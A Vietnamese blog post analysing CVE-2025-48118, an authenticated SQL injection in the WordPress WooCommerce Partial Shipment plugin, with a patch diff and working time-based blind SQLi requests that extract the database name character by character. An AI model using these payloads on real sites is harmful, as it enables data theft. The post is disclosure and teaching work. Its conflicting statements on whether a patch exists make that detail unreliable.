# CVE-2025-48118 Analysis & POC


<!--more-->

Lỗ hổng xảy ra trên plugin **Woocommerce Partial Shipment** của WordPress trước phiên bản **3.3**. Điều này có thể cho phép kẻ tấn công trực tiếp tương tác với cơ sở dữ liệu của bạn, bao gồm không giới hạn ở việc đánh cắp thông tin.

* **CVE ID**: [CVE-2025-48118](https://www.cve.org/CVERecord?id=CVE-2025-48118)
* **Product**: [WordPress Woocommerce Partial Shipment Plugin](https://wordpress.org/plugins/wc-partial-shipment/advanced/)
* **Vulnerability Type**: SQL Injection
* **Affected Versions**: <= 3.2
* **CVSS severity**:  High (8.5)
* **Required Privilege**: Subscriber

## Requirements

* **Local WordPress & Debugging**: [Local WordPress and Debugging](https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/).
- **Woocommerce Partial Shipment**:  v3.2(vul) và v3.3(fix)
- **diff tool**: **meld** hoặc bất cứ tool nào có thể compare để thấy được sự khác biệt giữa 2 version
- **Actived WooCommerce plugin**: plugin bắt buộc **actived** trước khi cài **Woocommerce Partial Shipment Plugin**, một số hàm trong **WooCommerce** sẽ được sử dụng.

## Analysis

Nguyên nhân cố lõi do ứng dụng chèn trực tiếp dữ liệu từ **POST** request vào SQL query mà không có cơ chế kiểm soát chặt chẽ.

### Patch Diff

Dùng diff tool bất kì để so sánh sự khác biệt giữa bản lỗi và bản vá.
Có sự khác biệt rõ ở file **wc-partial-shipment/woocommerce-partial-shipment.php**

Nhưng ở đây, dev thay đổi khá nhiều ta khó để tìm được vị trí lỗi.

> Trong WordPress, để SQLi xảy ra, ứng dụng phải tương tác với database thông qua biến global `$wpdb`, ta search từ khóa này trong file **wc-partial-shipment/woocommerce-partial-shipment.php** để tìm sink.

{{< figure src="search_sink.png" caption="Kết quả tìm vị trí sink trong mã nguồn" alt="search sink" >}}

`get_shipment_id` và `get_wxp_shipment_data` là 2 hàm thuộc class **WXP_Partial_Shipment** đáng chú ý, dữ liệu được đưa thẳng vào câu query mà không có cơ chế kiểm soát nào. Do đó, lỗ hổng SQLi có thể xảy ra.

{{< figure src="patch.png" caption="So sánh sự khác biệt giữa bản lỗi và bản vá" alt="Patch" >}}

Bản vá sử dụng `$wpdb->prepare()` để chuẩn bị câu query, thay vì **nối trực tiếp dữ liệu từ người dùng**. Điều này đảm bảo rằng tất cả giá trị được **escape đúng cách** trước khi chèn vào SQL, ngăn ngừa nguy cơ SQL Injection.

### How it work?

`get_shipment_id` và `get_wxp_shipment_data` đều được hàm `wxp_order_set_shipped` trong cùng class gọi và sử dụng.

```php
function wxp_order_set_shipped(){
    $order_id = isset($_POST['order_id']) ? $_POST['order_id'] : 0;
    // other logic

    $wxp_shipment = $this->get_wxp_shipment_data($order_id);
    if(isset($_POST['order_id']) && $_POST['order_id']){
        global $wpdb;
        $shipment_id = $this->get_shipment_id($_POST['order_id']);
        if(!$shipment_id){
            $data = array(
                'order_id' =>$order_id,
                'shipment_id' =>1,
                'shipment_url'=>'',
                'shipment_num'=>'',
                'shipment_date'=>current_time('timestamp',0),
            );
            $wpdb->insert($wpdb->prefix."partial_shipment",$data,array('%d','%d','%s','%s','%s'));
            $shipment_id = $wpdb->insert_id;
        }
    // other logic     
    }

    echo json_encode(array('order_id'=>$order_id,'status'=>$status_key));
    exit();
}
```

👉 `order_id` được lấy từ **POST request**, nơi người dùng có thể kiểm soát làm đối số khi gọi hàm `get_shipment_id` và `get_wxp_shipment_data`
truyền vào câu query chứa lổ hỗng SQLi.

Để xác định nơi `wxp_order_set_shipped` được gọi và sử dụng, ta tìm kiếm với từ khóa `wxp_order_set_shipped` trong thư mục chứa plugin.

{{< figure src="search_1.png" caption="Tìm vị trí nơi hàm wxp_order_set_shipped được gọi" alt="Search 1" >}}

`wxp_order_set_shipped` được `construct` của cùng class sử dụng làm callback cho hook `wp_ajax_wxp_order_set_shipped` => yêu cầu người dùng phải đăng nhập

👉 Khi truy cập vào `/wp-admin/admin-ajax.php` với tham số:

```
action=wxp_order_set_shipped&order_id=payload_here
```

* Callback `wxp_order_set_shipped` được gọi
* `order_id` được lấy trực tiếp từ request và chèn vào SQL query.
* Query thực thi 2 lần do được truyền vào 2 hàm chạy lệnh SQL với payload độc hại.

## Exploit

### Detect SQLi

Gửi **POST request** chứa payload SQLi.

```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: localhost
...
Cookie: cookie_here

action=wxp_order_set_shipped&order_id=(SELECT 1 FROM (SELECT SLEEP(5))a)
```

Khi đó câu query sẽ trở thành:

```sql
SELECT id as ship_id FROM wp_partial_shipment WHERE order_id=(SELECT 1 FROM (SELECT SLEEP(5))a)
```

Ở đây có 2 nơi thực hiện query nên thời gian phản hồi sẽ tăng gấp đôi

{{< figure src="time_resp.png" caption="Kết quả phản hồi khi khai thác thành công" alt="time response" >}}

Ta sử dụng **subquery trong mệnh đề FROM** vì truy vấn con được coi như một bảng tạm thời. MySQL sẽ thực thi truy vấn con trước để tạo bảng tạm, sau đó mới thực hiện truy vấn chính. Khi so sánh theo từng row, `SLEEP` chỉ chạy một lần trong quá trình khởi tạo bảng tạm, các lần so sánh tiếp theo sẽ không thực thi lại, nhờ đó tránh việc `SLEEP` bị nhân nhiều lần.

Ví dụ khi gửi request với payload này:

```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: localhost
...
Cookie: cookie_here

action=wxp_order_set_shipped&order_id=(SELECT SLEEP(5))
```

Thời gian trả về tăng theo cấp số nhân

{{< figure src="search_2.png" caption="Thời gian phản hồi tăng theo cấp số nhân" alt="search 2" >}}

### Get First Letter of Database Name

Điều kiện tiên quyết để **dump được hết data** là phải dump được 1 ký tự bất kỳ của tên database, nếu lấy được thì gần như toàn bộ data đều dump được.

Gửi request với **SQLi payload**:

```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: localhost
...
Cookie: cookie_here

action=wxp_order_set_shipped&order_id=(SELECT 1 FROM (SELECT IF(SUBSTRING(SCHEMA(),1,1)=0x77, SLEEP(5), 1))a)
```

Sử dụng `SUBSTRING()` để lấy ký tự đầu tiên của **database name**, `IF()` trả về `SLEEP(5)` nếu ký tự đó là `0x77`('w')

Sử dụng hex encoding `w` thành `0x77` vì `order_id` được lấy từ **POST** request trong nên bị escape bởi [magic quotes](https://patchstack.com/academy/wordpress/vulnerabilities/sql-injection/#magic-quotes) trong WordPress và bởi `sanitize_text_field`.

👉 Dựa trên thời gian phản hồi => kí tự đầu tiên đúng là `w`.

## Conclusion

Lỗ hổng **CVE-2025-48118** trong plugin WordPress **Woocommerce Partial Shipment** trước phiên bản **3.3**, xuất phát từ việc truyền trực tiếp input từ người dùng vào SQL query mà không có biện pháp kiểm soát chặt chẽ dẫn đến lỗ hổng SQL Injection.

Chưa có bản vá chính thực nào cho lỗ hổng này.

**Key takeaways**:

* Kiểm soát kỹ input từ người dùng.
* Luôn sử dụng `$wpdb->prepare()` khi làm việc với database trong WordPress để tránh SQL Injection.
* Thường xuyên cập nhật plugin và kiểm tra bảo mật để tránh trở thành mục tiêu tấn công.

## References

[SQL Injection cheat sheet - PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)

[WordPress Woocommerce Partial Shipment Plugin <= 3.2 is vulnerable to SQL Injection](https://patchstack.com/database/wordpress/plugin/wc-partial-shipment/vulnerability/wordpress-woocommerce-partial-shipment-3-2-sql-injection-vulnerability)


---

> Tác giả: [Bui Van Y](github.com/w41bu1)  
> URL: http://localhost:1313/vi/posts/2025-09-29-cve-2025-48118/  

